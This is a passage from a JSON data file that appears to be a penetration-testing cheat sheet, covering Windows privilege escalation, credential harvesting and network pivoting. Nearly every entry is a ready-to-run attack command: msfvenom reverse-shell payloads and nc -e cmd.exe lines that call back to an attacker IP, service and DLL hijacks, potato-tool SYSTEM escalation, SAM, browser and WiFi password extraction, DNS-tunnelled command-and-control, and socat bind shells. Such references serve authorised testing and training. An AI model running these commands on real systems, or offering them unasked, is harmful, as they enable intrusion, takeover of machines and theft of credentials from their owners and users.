                    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f exe-service -o malicious.exe"
                  ]
                },
                {
                  "cmd": [
                    ":: Replace the binary and restart",
                    "move \"C:\\path\\to\\service.exe\" \"C:\\path\\to\\service.exe.bak\"",
                    "copy C:\\Temp\\malicious.exe \"C:\\path\\to\\service.exe\"",
                    "sc stop <SERVICE-NAME>",
                    "sc start <SERVICE-NAME>",
                    "",
                    ":: If you can't restart the service and it's set to auto-start, reboot",
                    "shutdown /r /t 0"
                  ]
                }
              ]
            },
            {
              "desc": "Service Binary Path Modification",
              "entries": [
                {
                  "subdesc": "When to exploit: You can't replace the binary, but you have permission to modify the service configuration (check with accesschk.exe -wuvc <SERVICE>).",
                  "cmd": [
                    "# Check current config",
                    "sc qc <SERVICE>",
                    "",
                    "# Change the binary path to your payload",
                    "sc config <SERVICE> binpath= \"C:\\Temp\\nc.exe <ATTACKER-IP> <ATTACKER-PORT> -e cmd.exe\"",
                    "",
                    "sc stop <SERVICE>",
                    "sc start <SERVICE>"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-51",
          "name": "Windows PrivEsc: DLL Hijacking",
          "description": "When to exploit: An application loads a DLL from a directory you can write to. Use Process Monitor (procmon) to find missing DLLs (\"NAME NOT FOUND\" results). Plant your malicious DLL where the application looks first.",
          "commands": [
            {
              "desc": "DLL Search Order",
              "entries": [
                {
                  "subdesc": "1. Application directory 2. C:WindowsSystem32 3. C:WindowsSystem 4. C:Windows 5. Current working directory 6. Directories in PATH",
                  "cmd": [
                    "# Generate malicious DLL",
                    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f dll -o hijack.dll"
                  ]
                },
                {
                  "cmd": [
                    ":: Use Process Monitor to identify missing DLLs",
                    ":: Filters: Result = \"NAME NOT FOUND\" AND Path ends with \".dll\"",
                    "",
                    ":: Place malicious DLL where the app looks for it",
                    "copy C:\\Temp\\hijack.dll \"C:\\path\\to\\writable\\directory\\missing.dll\"",
                    "",
                    ":: Trigger the application to load the DLL (restart service, reboot, or wait)"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-52",
          "name": "Windows PrivEsc: Unquoted Service Paths",
          "description": "When to exploit: A service path contains spaces and is NOT enclosed in quotes. Windows will try intermediate paths — place your payload at one of those paths. Example: Unquoted path C:\\Program Files\\My App\\service.exe — Windows tries in order: 1. C:\\Program.exe 2. C:\\Program Files\\My.exe 3. C:\\Program Files\\My App\\service.exe",
          "commands": [
            {
              "desc": "Unquoted Service Paths",
              "entries": [
                {
                  "subdesc": "When to exploit: A service path contains spaces and is NOT enclosed in quotes. Windows will try intermediate paths — place your payload at one of those paths. Example: Unquoted path C:\\Program Files\\My App\\service.exe — Windows tries in order: 1. C:\\Program.exe 2. C:\\Program Files\\My.exe 3. C:\\Program Files\\My App\\service.exe",
                  "cmd": [
                    ":: Find unquoted service paths",
                    "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\""
                  ]
                },
                {
                  "cmd": [
                    "# PowerShell alternative",
                    "Get-WmiObject Win32_Service | Where-Object { $_.PathName -notmatch '\"' -and $_.PathName -match ' ' } | Select Name, PathName, StartMode"
                  ]
                },
                {
                  "cmd": [
                    ":: Check write permissions on each intermediate directory",
                    "icacls \"C:\\Program Files\\My App\""
                  ]
                },
                {
                  "cmd": [
                    "# Create a payload matching the intermediate path name",
                    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f exe -o My.exe"
                  ]
                },
                {
                  "cmd": [
                    ":: Place it and restart the service",
                    "copy C:\\Temp\\My.exe \"C:\\Program Files\\My.exe\"",
                    "sc stop <SERVICE>",
                    "sc start <SERVICE>"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-53",
          "name": "Windows PrivEsc: SE Privileges Exploitation",
          "description": "When to check: Run whoami /priv on every new shell. Certain privileges provide direct paths to SYSTEM. These are extremely common on IIS/MSSQL/service accounts.",
          "commands": [
            {
              "desc": "SE Privileges Exploitation",
              "entries": [
                {
                  "subdesc": "When to check: Run whoami /priv on every new shell. Certain privileges provide direct paths to SYSTEM. These are extremely common on IIS/MSSQL/service accounts.",
                  "cmd": [
                    ":: Check your privileges",
                    "whoami /priv"
                  ]
                }
              ]
            },
            {
              "desc": "SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege",
              "entries": [
                {
                  "cmd": [
                    ":: Get SYSTEM shell — simplest potato attack",
                    "PrintSpoofer64.exe -i -c cmd",
                    "PrintSpoofer64.exe -i -c \"C:\\Temp\\shell.exe\"",
                    "PrintSpoofer64.exe -c \"C:\\Temp\\nc.exe <ATTACKER-IP> <PORT> -e cmd.exe\""
                  ],
                  "subdesc": "PrintSpoofer (Windows 10 / Server 2016-2019)"
                },
                {
                  "subdesc": "GodPotato (Broadest Compatibility — Windows 8+ / Server 2012+) — Tip: Try GodPotato first — it works on the widest range of Windows versions.",
                  "cmd": [
                    "GodPotato.exe -cmd \"C:\\Temp\\nc.exe <ATTACKER-IP> <PORT> -e cmd.exe\"",
                    "GodPotato.exe -cmd \"cmd /c whoami\""
                  ]
                },
                {
                  "cmd": [
                    "JuicyPotato.exe -l <LOCAL-PORT> -p C:\\Temp\\shell.exe -t *",
                    "JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c C:\\Temp\\nc.exe <ATTACKER-IP> <PORT> -e cmd.exe\" -t *",
                    "",
                    ":: If default CLSID fails, try others from: https://ohpe.it/juicy-potato/CLSID/"
                  ],
                  "subdesc": "JuicyPotato (Windows 7-10 / Server 2008-2016)"
                }
              ]
            },
            {
              "desc": "SeBackupPrivilege",
              "entries": [
                {
                  "subdesc": "Impact: Read any file on the system — dump SAM and SYSTEM registry hives to extract local account hashes.",
                  "cmd": [
                    ":: Export registry hives (works even on protected files)",
                    "reg save HKLM\\SAM C:\\Temp\\SAM",
                    "reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM"
                  ]
                },
                {
                  "cmd": [
                    "# Transfer to attacker and extract hashes",
                    "impacket-secretsdump -sam SAM -system SYSTEM LOCAL"
                  ]
                }
              ]
            },
            {
              "desc": "SeTakeOwnershipPrivilege",
              "entries": [
                {
                  "subdesc": "Impact: Take ownership of any file or registry key, then grant yourself full access.",
                  "cmd": [
                    ":: Take ownership of a protected file and grant yourself access",
                    "takeown /f \"C:\\Windows\\System32\\config\\SAM\"",
                    "icacls \"C:\\Windows\\System32\\config\\SAM\" /grant %username%:F"
                  ]
                }
              ]
            },
            {
              "desc": "SeManageVolumePrivilege",
              "entries": [
                {
                  "subdesc": "Impact: Use SeManageVolumeExploit tool to gain write access to the C: volume, then overwrite a DLL or binary.",
                  "cmd": [
                    ":: Run the exploit tool to gain write access to C:\\",
                    "SeManageVolumeExploit.exe",
                    ":: Then perform a DLL hijacking or binary replacement attack"
                  ]
                }
              ]
            },
            {
              "desc": "SeDebugPrivilege",
              "entries": [
                {
                  "subdesc": "Impact: Debug any process — migrate into a SYSTEM process to escalate.",
                  "cmd": [
                    ":: In meterpreter: find a SYSTEM process and migrate into it",
                    "meterpreter> ps",
                    "meterpreter> migrate <SYSTEM-PID>",
                    "meterpreter> getuid"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-54",
          "name": "Windows PrivEsc: Always Install Elevated",
          "description": "When to exploit: Both HKLM and HKCU registry keys are set to 1. This allows any user to install MSI packages with SYSTEM privileges.",
          "commands": [
            {
              "desc": "Always Install Elevated",
              "entries": [
                {
                  "subdesc": "When to exploit: Both HKLM and HKCU registry keys are set to 1. This allows any user to install MSI packages with SYSTEM privileges.",
                  "cmd": [
                    ":: Check if enabled (BOTH must be set to 1)",
                    "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                    "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
                  ]
                },
                {
                  "cmd": [
                    "# Generate MSI payload",
                    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f msi -o evil.msi"
                  ]
                },
                {
                  "cmd": [
                    ":: Install silently — triggers as SYSTEM",
                    "msiexec /quiet /qn /i evil.msi"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-55",
          "name": "Windows PrivEsc: Startup Applications",
          "description": "When to exploit: You have write access to a Startup directory. Your payload executes on next user login.",
          "commands": [
            {
              "desc": "Startup Applications",
              "entries": [
                {
                  "subdesc": "When to exploit: You have write access to a Startup directory. Your payload executes on next user login.",
                  "cmd": [
                    ":: Check writable startup directories",
                    "icacls \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"",
                    "",
                    ":: Place payload — runs on next login",
                    "copy C:\\Temp\\shell.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe\""
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-56",
          "name": "Windows PrivEsc: Token Impersonation (Meterpreter)",
          "description": "When to use: You have a meterpreter session and want to impersonate another logged-in user (e.g., Domain Admin).",
          "commands": [
            {
              "desc": "Token Impersonation (Meterpreter)",
              "entries": [
                {
                  "subdesc": "When to use: You have a meterpreter session and want to impersonate another logged-in user (e.g., Domain Admin).",
                  "cmd": [
                    "# In meterpreter session",
                    "load incognito",
                    "list_tokens -u",
                    "impersonate_token \"NT AUTHORITY\\\\SYSTEM\"",
                    "impersonate_token \"<DOMAIN>\\\\<ADMIN-USER>\""
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-57",
          "name": "Windows PrivEsc: Registry Autorun",
          "description": "When to exploit: An autorun entry points to a binary you can overwrite.",
          "commands": [
            {
              "desc": "Registry Autorun",
              "entries": [
                {
                  "subdesc": "When to exploit: An autorun entry points to a binary you can overwrite.",
                  "cmd": [
                    ":: Check autorun entries",
                    "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "",
                    ":: If the binary path is writable, replace it with your payload",
                    ":: It will execute the next time the user or system starts"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-58",
          "name": "Windows PrivEsc: Scheduled Tasks",
          "description": "When to check: If a scheduled task runs a binary or script that the current user can overwrite, you can replace it with a payload to escalate privileges.",
          "commands": [
            {
              "desc": "Scheduled Tasks",
              "entries": [
                {
                  "subdesc": "When to check: If a scheduled task runs a binary or script that the current user can overwrite, you can replace it with a payload to escalate privileges.",
                  "cmd": [
                    "# List all scheduled tasks",
                    "schtasks /query /fo TABLE /nh",
                    "",
                    "# Get details on a specific task — look at \"Task to Run\" and \"Run As User\"",
                    "schtasks /query /tn \"<TASK-NAME>\" /fo LIST /v",
                    "",
                    "# Check permissions on the binary the task runs",
                    "icacls \"C:\\Path\\To\\Scheduled\\Binary.exe\"",
                    "# Look for: (F) Full, (M) Modify, (W) Write for your user or group",
                    "",
                    "# If writable, replace the binary with your payload",
                    "# Generate a service binary:",
                    "# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe",
                    "copy C:\\Path\\To\\Scheduled\\Binary.exe C:\\Path\\To\\Scheduled\\Binary.exe.bak",
                    "copy \\\\<ATTACKER-IP>\\share\\payload.exe C:\\Path\\To\\Scheduled\\Binary.exe"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-59",
          "name": "Windows PrivEsc: Credential Harvesting",
          "description": "When to run: After landing on any Windows system. Always check ALL these locations — they frequently contain cleartext or extractable credentials.",
          "commands": [
            {
              "desc": "PowerShell History",
              "entries": [
                {
                  "cmd": [
                    "# PowerShell ConsoleHost history — may contain plaintext passwords from previous commands",
                    "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
                    "",
                    "# PowerShell equivalent",
                    "Get-Content (Get-PSReadLineOption).HistorySavePath",
                    "",
                    "# Check all users",
                    "Get-ChildItem C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>$null"
                  ]
                }
              ]
            },
            {
              "desc": "Stored Credentials (cmdkey / runas)",
              "entries": [
                {
                  "cmd": [
                    ":: Check for stored credentials",
                    "cmdkey /list",
                    "",
                    ":: If you see stored credentials, use runas /savecred to execute as that user",
                    "runas /savecred /user:<DOMAIN>\\<USER> cmd.exe",
                    "runas /savecred /user:administrator cmd.exe",
                    "",
                    ":: Common scenario: stored admin creds + runas = instant SYSTEM"
                  ]
                }
              ]
            },
            {
              "desc": "Browser Saved Passwords",
              "entries": [
                {
                  "cmd": [
                    "# SharpChrome — extract Chrome saved passwords and cookies",
                    ".\\SharpChrome.exe logins",
                    ".\\SharpChrome.exe cookies",
                    "",
                    "# LaZagne — extract ALL saved passwords from the system",
                    ".\\LaZagne.exe all",
                    "",
                    "# Manual Chrome password locations",
                    "Get-ChildItem \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\"",
                    "Get-ChildItem \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies\""
                  ]
                }
              ]
            },
            {
              "desc": "WiFi Passwords",
              "entries": [
                {
                  "cmd": [
                    ":: List saved WiFi profiles",
                    "netsh wlan show profiles",
                    "",
                    ":: Extract the plaintext password for a specific profile",
                    "netsh wlan show profile name=\"<WIFI-NAME>\" key=clear"
                  ]
                }
              ]
            },
            {
              "desc": "Windows Credential Manager",
              "entries": [
                {
                  "cmd": [
                    "# List stored credentials in Credential Manager",
                    "vaultcmd /listcreds:\"Windows Credentials\" /all",
                    "vaultcmd /listcreds:\"Web Credentials\" /all",
                    "",
                    "# PowerShell alternative",
                    "[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]",
                    "$vault = New-Object Windows.Security.Credentials.PasswordVault",
                    "$vault.RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ } | Select UserName, Resource, Password"
                  ]
                }
              ]
            },
            {
              "desc": "Registry Credential Hunting",
              "entries": [
                {
                  "cmd": [
                    ":: Autologon credentials (very common finding)",
                    "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul | findstr /i \"DefaultUserName DefaultPassword\"",
                    "",
                    ":: VNC stored passwords",
                    "reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"",
                    "reg query \"HKLM\\SOFTWARE\\RealVNC\\WinVNC4\" /v password",
                    "",
                    ":: PuTTY stored proxy credentials",
                    "reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" /s | findstr /i \"Proxy\"",
                    "",
                    ":: SNMP community strings",
                    "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities\"",
                    "",
                    ":: Search registry for password strings",
                    "reg query HKLM /f password /t REG_SZ /s 2>nul | head -50",
                    "reg query HKCU /f password /t REG_SZ /s 2>nul | head -50"
                  ]
                }
              ]
            },
            {
              "desc": "Sensitive Files",
              "entries": [
                {
                  "cmd": [
                    "# Unattend/sysprep files (may contain base64-encoded admin passwords)",
                    "Get-ChildItem C:\\unattend.xml, C:\\Windows\\Panther\\Unattend.xml, C:\\Windows\\Panther\\Unattend\\Unattend.xml, C:\\Windows\\System32\\Sysprep\\Unattend.xml, C:\\Windows\\System32\\Sysprep\\sysprep.xml -ErrorAction SilentlyContinue",
                    "",
                    "# IIS config with connection strings",
                    "type C:\\inetpub\\wwwroot\\web.config 2>nul | findstr /i \"connectionString password\"",
                    "type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config 2>nul | findstr /i \"connectionString password\"",
                    "",
                    "# SAM and SYSTEM backup files",
                    "Get-ChildItem C:\\Windows\\Repair\\SAM, C:\\Windows\\Repair\\SYSTEM, C:\\Windows\\System32\\config\\RegBack\\SAM, C:\\Windows\\System32\\config\\RegBack\\SYSTEM -ErrorAction SilentlyContinue"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-60",
          "name": "Windows PrivEsc: icacls Permission Checks",
          "description": "When to run: Before exploiting any service binary, DLL, or scheduled task. icacls confirms whether you actually have write access.",
          "commands": [
            {
              "desc": "icacls Permission Checks",
              "entries": [
                {
                  "subdesc": "When to run: Before exploiting any service binary, DLL, or scheduled task. icacls confirms whether you actually have write access.",
                  "cmd": [
                    ":: Check permissions on a service binary",
                    "icacls \"C:\\Program Files\\Service\\binary.exe\"",
                    "",
                    ":: Check permissions on a directory (for DLL hijacking / unquoted paths)",
                    "icacls \"C:\\Program Files\\Vulnerable Service\\\"",
                    "",
                    ":: Key permission flags:",
                    ":: (F) = Full Control",
                    ":: (M) = Modify (read, write, execute, delete)",
                    ":: (W) = Write",
                    ":: (RX) = Read + Execute",
                    ":: Look for your username, \"Users\", \"Everyone\", or \"Authenticated Users\" with F, M, or W"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-61",
          "name": "SSH Port Forwarding",
          "description": "SSH Port Forwarding",
          "commands": [
            {
              "desc": "Local Port Forwarding",
              "entries": [
                {
                  "subdesc": "Forward a local port on the attacker to a remote service through the SSH server:",
                  "cmd": [
                    "# Syntax: ssh -L <LOCAL-PORT>:<TARGET-HOST>:<TARGET-PORT> <SSH-USER>@<SSH-SERVER>",
                    "",
                    "# Access internal web server (10.10.10.50:80) via localhost:8080",
                    "ssh -L 8080:10.10.10.50:80 user@<COMPROMISED-HOST>",
                    "# Now browse: http://localhost:8080",
                    "",
                    "# Access internal RDP (10.10.10.50:3389) via localhost:3389",
                    "ssh -L 3389:10.10.10.50:3389 user@<COMPROMISED-HOST>",
                    "xfreerdp /v:localhost /u:admin /p:password",
                    "",
                    "# Multiple forwards in one command",
                    "ssh -L 8080:10.10.10.50:80 -L 445:10.10.10.50:445 user@<COMPROMISED-HOST>"
                  ]
                }
              ]
            },
            {
              "desc": "Remote Port Forwarding",
              "entries": [
                {
                  "subdesc": "Expose an internal service on the target back to the attacker's machine:",
                  "cmd": [
                    "# Syntax: ssh -R <REMOTE-PORT>:<TARGET-HOST>:<TARGET-PORT> <ATTACKER-USER>@<ATTACKER-IP>",
                    "",
                    "# From the compromised host, expose internal web server to attacker",
                    "ssh -R 8080:10.10.10.50:80 kali@<ATTACKER-IP>",
                    "# Attacker can now access http://localhost:8080",
                    "",
                    "# Expose internal MySQL to attacker",
                    "ssh -R 3306:10.10.10.50:3306 kali@<ATTACKER-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Dynamic Port Forwarding (SOCKS Proxy)",
              "entries": [
                {
                  "subdesc": "Create a SOCKS proxy that routes all traffic through the compromised host:",
                  "cmd": [
                    "# Create SOCKS4/5 proxy on local port 1080",
                    "ssh -D 1080 user@<COMPROMISED-HOST>",
                    "",
                    "# Configure proxychains to use the SOCKS proxy",
                    "# Edit /etc/proxychains4.conf:",
                    "# socks5 127.0.0.1 1080",
                    "",
                    "# Route tools through the tunnel",
                    "proxychains nmap -sT -Pn 10.10.10.0/24",
                    "proxychains curl http://10.10.10.50",
                    "proxychains evil-winrm -i 10.10.10.50 -u admin -p password"
                  ]
                }
              ]
            },
            {
              "desc": "Remote Dynamic Port Forwarding",
              "entries": [
                {
                  "cmd": [
                    "# From compromised host: Create SOCKS proxy on attacker's port 1080",
                    "ssh -R 1080 kali@<ATTACKER-IP>",
                    "# Attacker uses proxychains with socks5 127.0.0.1 1080"
                  ]
                }
              ]
            },
            {
              "desc": "SSH Dynamic (non-interactive)",
              "entries": [
                {
                  "cmd": [
                    "# Run SSH in background (no interactive shell)",
                    "ssh -f -N -D 1080 user@<HOST>",
                    "# -f = background, -N = no command execution",
                    "",
                    "# Use SSH config for persistence",
                    "# ~/.ssh/config:",
                    "# Host pivot",
                    "#     HostName <COMPROMISED-HOST>",
                    "#     User user",
                    "#     DynamicForward 1080",
                    "#     LocalForward 8080 10.10.10.50:80"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-62",
          "name": "Chisel (TCP Tunneling over HTTP)",
          "description": "Chisel creates TCP tunnels transported over HTTP, ideal when SSH is not available.",
          "commands": [
            {
              "desc": "Setup",
              "entries": [
                {
                  "cmd": [
                    "# Download chisel for both architectures",
                    "# Linux: chisel_linux_amd64",
                    "# Windows: chisel_windows_amd64.exe"
                  ]
                }
              ]
            },
            {
              "desc": "Reverse SOCKS Proxy (Most Common)",
              "entries": [
                {
                  "cmd": [
                    "# On attacker: Start chisel server",
                    "chisel server --reverse --port 8000",
                    "",
                    "# On target: Connect back and create SOCKS proxy",
                    "./chisel client <ATTACKER-IP>:8000 R:socks",
                    "",
                    "# This creates a SOCKS5 proxy on attacker's port 1080",
                    "# Configure proxychains: socks5 127.0.0.1 1080",
                    "proxychains nmap -sT -Pn 10.10.10.0/24"
                  ]
                }
              ]
            },
            {
              "desc": "Remote Port Forward",
              "entries": [
                {
                  "cmd": [
                    "# Forward specific port from internal network to attacker",
                    "# On attacker:",
                    "chisel server --reverse --port 8000",
                    "",
                    "# On target:",
                    "./chisel client <ATTACKER-IP>:8000 R:8080:10.10.10.50:80",
                    "# Attacker accesses http://localhost:8080"
                  ]
                }
              ]
            },
            {
              "desc": "Local Port Forward",
              "entries": [
                {
                  "cmd": [
                    "# On target (or pivot host): Start server",
                    "chisel server --port 8000",
                    "",
                    "# On attacker: Forward local port",
                    "chisel client <PIVOT-HOST>:8000 8080:10.10.10.50:80"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-63",
          "name": "Ligolo-ng (Advanced Tunneling)",
          "description": "Ligolo-ng creates a virtual TUN interface, enabling full network access to the internal network without SOCKS proxies. <page url=\"https://www.notion.so/24dbc6f1839280af9a34e62361756eec\">Ligolo</page>",
          "commands": [
            {
              "desc": "Setup",
              "entries": [
                {
                  "cmd": [
                    "# On attacker: Create TUN interface and start proxy",
                    "sudo ip tuntap add user $(whoami) mode tun ligolo",
                    "sudo ip link set ligolo up",
                    "",
                    "# Start ligolo proxy",
                    "./proxy -selfcert -laddr 0.0.0.0:443"
                  ]
                }
              ]
            },
            {
              "desc": "Connect Agent",
              "entries": [
                {
                  "cmd": [
                    "# On target: Run agent",
                    "./agent -connect <ATTACKER-IP>:443 -ignore-cert",
                    "",
                    "# In ligolo proxy console:",
                    ">> session           # List sessions",
                    ">> session 1         # Select session",
                    ">> ifconfig          # View target's network interfaces"
                  ]
                }
              ]
            },
            {
              "desc": "Route Traffic",
              "entries": [
                {
                  "cmd": [
                    "# Add route to internal subnet through ligolo interface",
                    "sudo ip route add 10.10.10.0/24 dev ligolo",
                    "",
                    "# In ligolo console:",
                    ">> start             # Start tunneling",
                    "",
                    "# Now access internal hosts directly (no proxychains needed!)",
                    "nmap -sT -Pn 10.10.10.50",
                    "curl http://10.10.10.50",
                    "evil-winrm -i 10.10.10.50 -u admin -p password"
                  ]
                }
              ]
            },
            {
              "desc": "Double Pivot",
              "entries": [
                {
                  "cmd": [
                    "# Add a listener on the first pivot for the second agent",
                    ">> listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:443 --tcp",
                    "",
                    "# On second target: Connect through first pivot",
                    "./agent -connect <FIRST-PIVOT-IP>:11601 -ignore-cert",
                    "",
                    "# Add route for deeper subnet",
                    "sudo ip route add 172.16.0.0/24 dev ligolo"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-64",
          "name": "Sshuttle (VPN over SSH)",
          "description": "Transparent proxy that acts like a VPN but requires only SSH access:",
          "commands": [
            {
              "desc": "Sshuttle (VPN over SSH)",
              "entries": [
                {
                  "subdesc": "Transparent proxy that acts like a VPN but requires only SSH access:",
                  "cmd": [
                    "# Route all traffic to internal subnet through SSH",
                    "sshuttle -r user@<COMPROMISED-HOST> 10.10.10.0/24",
                    "",
                    "# With password authentication",
                    "sshuttle -r user@<COMPROMISED-HOST> 10.10.10.0/24 --ssh-cmd 'sshpass -p password ssh'",
                    "",
                    "# Exclude certain subnets",
                    "sshuttle -r user@<COMPROMISED-HOST> 10.10.10.0/24 -x 10.10.10.1/32",
                    "",
                    "# Route all traffic (full VPN)",
                    "sshuttle -r user@<COMPROMISED-HOST> 0.0.0.0/0"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-65",
          "name": "Windows Pivoting Tools",
          "description": "Windows Pivoting Tools",
          "commands": [
            {
              "desc": "netsh Port Forwarding",
              "entries": [
                {
                  "cmd": [
                    ":: Forward local port to internal host",
                    "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.50",
                    "",
                    ":: List current port forwards",
                    "netsh interface portproxy show all",
                    "",
                    ":: Remove a forward",
                    "netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0",
                    "",
                    ":: Open firewall for the forwarded port",
                    "netsh advfirewall firewall add rule name=\"pivot\" protocol=TCP dir=in localport=8080 action=allow"
                  ]
                }
              ]
            },
            {
              "desc": "ssh.exe (Windows 10+ Built-in)",
              "entries": [
                {
                  "cmd": [
                    ":: Local port forward",
                    "ssh -L 8080:10.10.10.50:80 user@<COMPROMISED-HOST>",
                    "",
                    ":: Dynamic SOCKS proxy",
                    "ssh -D 1080 user@<COMPROMISED-HOST>"
                  ]
                }
              ]
            },
            {
              "desc": "Plink (PuTTY CLI)",
              "entries": [
                {
                  "cmd": [
                    ":: Remote port forward",
                    "plink.exe -ssh -l <USER> -pw <PASSWORD> -R 8080:10.10.10.50:80 <ATTACKER-IP>"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-66",
          "name": "Proxychains Configuration",
          "description": "Proxychains Configuration",
          "commands": [
            {
              "desc": "Proxychains Configuration",
              "entries": [
                {
                  "cmd": [
                    "# /etc/proxychains4.conf",
                    "# Uncomment: dynamic_chain",
                    "# Comment out: strict_chain",
                    "# Add proxy at bottom:",
                    "socks5 127.0.0.1 1080",
                    "",
                    "# Usage examples",
                    "proxychains nmap -sT -Pn -p 22,80,443,445,3389 10.10.10.50",
                    "proxychains ssh user@10.10.10.50",
                    "proxychains crackmapexec smb 10.10.10.0/24"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-67",
          "name": "DNS Tunneling (dnscat2)",
          "description": "When to use: All other tunneling methods are blocked. DNS traffic (port 53) is almost never filtered. Use dnscat2 to tunnel C2 traffic over DNS queries. Slower than other methods but extremely hard to block. Install: sudo apt install dnscat2 (server on Kali), download dnscat2 client binary for target OS.",
          "commands": [
            {
              "desc": "Server Setup (Attacker)",
              "entries": [
                {
                  "cmd": [
                    "# Start dnscat2 server",
                    "dnscat2-server <DOMAIN> --secret=<SHARED-SECRET>",
                    "",
                    "# Or without a domain (direct connection mode)",
                    "dnscat2-server --dns \"host=0.0.0.0,port=53\" --secret=<SHARED-SECRET>"
                  ]
                }
              ]
            },
            {
              "desc": "Client Connection (Target)",
              "entries": [
                {
                  "cmd": [
                    "# Linux client",
                    "./dnscat --dns \"server=<ATTACKER-IP>,port=53\" --secret=<SHARED-SECRET>",
                    "",
                    "# Windows client (PowerShell)",
                    "# Use dnscat2-powershell:",
                    "Import-Module .\\dnscat2.ps1",
                    "Start-Dnscat2 -Domain <DOMAIN> -DNSServer <ATTACKER-IP> -Secret <SHARED-SECRET>"
                  ]
                }
              ]
            },
            {
              "desc": "Usage",
              "entries": [
                {
                  "cmd": [
                    "# On the dnscat2 server:",
                    "# List sessions",
                    "sessions",
                    "",
                    "# Interact with a session",
                    "session -i <ID>",
                    "",
                    "# Open a command shell",
                    "shell",
                    "",
                    "# Port forwarding through the tunnel",
                    "listen 0.0.0.0:4444 <INTERNAL-TARGET>:445"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-68",
          "name": "Socat Tunneling",
          "description": "Purpose: Socat is a versatile relay tool. Useful when SSH is unavailable but you can upload a single binary. Works for port forwarding, encrypted tunnels, and bind/reverse connections.",
          "commands": [
            {
              "desc": "Port Forwarding",
              "entries": [
                {
                  "cmd": [
                    "# Forward local port to remote target (like SSH -L)",
                    "socat TCP-LISTEN:<LOCAL-PORT>,fork TCP:<TARGET-IP>:<TARGET-PORT>",
                    "",
                    "# Example: forward local 8080 to internal web server",
                    "socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80",
                    "",
                    "# Listen on all interfaces",
                    "socat TCP-LISTEN:<PORT>,fork,reuseaddr TCP:<TARGET-IP>:<PORT>"
                  ]
                }
              ]
            },
            {
              "desc": "Encrypted Tunnel (SSL)",
              "entries": [
                {
                  "cmd": [
                    "# Generate a self-signed certificate",
                    "openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem",
                    "cat key.pem cert.pem > tunnel.pem",
                    "",
                    "# Listener with SSL encryption",
                    "socat OPENSSL-LISTEN:<PORT>,cert=tunnel.pem,verify=0,fork TCP:<TARGET-IP>:<PORT>",
                    "",
                    "# Connect through SSL tunnel",
                    "socat TCP-LISTEN:<LOCAL-PORT>,fork OPENSSL:<RELAY-IP>:<PORT>,verify=0"
                  ]
                }
              ]
            },
            {
              "desc": "Bind Shell via Socat",
              "entries": [
                {
                  "cmd": [
                    "# On target (bind shell listener)",
                    "socat TCP-LISTEN:<PORT>,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
                    "",
                    "# On attacker (connect to bind shell)",
                    "socat - TCP:<TARGET-IP>:<PORT>",
                    "",
                    "# Encrypted bind shell",
                    "# Target:",
                    "socat OPENSSL-LISTEN:<PORT>,cert=tunnel.pem,verify=0,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
                    "# Attacker:",
